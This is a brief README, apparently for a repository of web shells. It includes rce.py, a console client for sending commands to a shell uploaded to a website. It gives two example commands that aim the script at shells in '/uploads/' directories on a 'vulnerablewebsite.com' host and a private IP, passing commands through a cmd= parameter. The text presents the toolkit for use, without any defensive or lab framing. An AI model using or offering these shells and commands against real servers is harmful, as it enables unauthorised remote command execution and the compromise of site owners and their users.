# WebShell-Upload
Here you can find WebShells. With rce.py, you can interact with the WebShell from the console. The rest of the files are the WebShells.

To use rce.py, you must pass to the script, as argument, the url of the webpage where the WebShell is located. For example:

python rce.py http://vulnerablewebsite.com/uploads/rce.asp?cmd=

python rce.py https://192.168.1.52:443/uploads/rce.php?cmd=
